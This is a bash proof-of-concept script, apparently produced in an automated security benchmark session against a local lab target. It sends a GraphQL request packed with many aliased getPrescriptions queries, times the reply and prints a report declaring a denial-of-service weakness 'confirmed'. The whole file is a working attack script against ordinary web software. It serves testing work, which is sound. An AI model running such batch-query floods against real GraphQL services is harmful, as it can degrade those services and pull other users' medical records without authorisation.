#!/bin/bash
# POC: Demonstrates GraphQL batch query DoS attack by sending multiple aliased queries in a single request to overwhelm the GraphQL server
# Target: ./repo
# Created: 2025-11-10T19:42:01.514Z
# Session: benchmark-XBEN-007-24-mhtjlewb

# GraphQL Batch Query DoS Attack POC
# This script demonstrates the lack of batch query restrictions on the GraphQL API
# by sending multiple aliased queries in a single request

TARGET_HOST="${1:-localhost:5003}"
TARGET_URL="http://$TARGET_HOST/graphql"
NUM_QUERIES="${2:-10}"

echo "[*] GraphQL Batch Query DoS Attack POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Number of queries in batch: $NUM_QUERIES"
echo ""

# Build the batch query with multiple aliases
QUERY_ALIASES=""
for i in $(seq 1 $NUM_QUERIES); do
    QUERY_ALIASES="$QUERY_ALIASES q$i: getPrescriptions(userId: 1) { id }"
done

# Construct the GraphQL query
GRAPHQL_QUERY="{ $QUERY_ALIASES }"

echo "[*] Sending batch query with $NUM_QUERIES aliases..."
echo "[*] Query structure: { q1: getPrescriptions(...) q2: getPrescriptions(...) ... q$NUM_QUERIES: getPrescriptions(...) }"
echo ""

# Make the request and measure response
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":\"$GRAPHQL_QUERY\"}")
END_TIME=$(date +%s%N)

ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))

echo "[+] Response received in ${ELAPSED_MS}ms"
echo ""

# Extract response data
echo "[+] Response:"
echo "$RESPONSE" | head -c 500
echo ""
echo ""

# Count returned objects
OBJECT_COUNT=$(echo "$RESPONSE" | grep -o '"id"' | wc -l)
echo "[+] Number of objects returned: $OBJECT_COUNT"

# Check if response contains errors
if echo "$RESPONSE" | grep -q '"errors"'; then
    echo "[!] Response contains errors - rate limiting or restrictions may be in place"
    echo "$RESPONSE" | grep -o '"message":"[^"]*"' | head -3
else
    echo "[!] No errors detected - server processed all $NUM_QUERIES queries"
    echo "[!] No batch query restrictions or rate limiting observed"
    echo "[!] DoS vulnerability confirmed: Server accepted and processed batch query without restrictions"
fi

echo ""
echo "[*] Vulnerability assessment:"
echo "    - Batch queries allowed: YES"
echo "    - Query complexity limits: NO"
echo "    - Rate limiting: NO"
echo "    - DoS risk: CONFIRMED"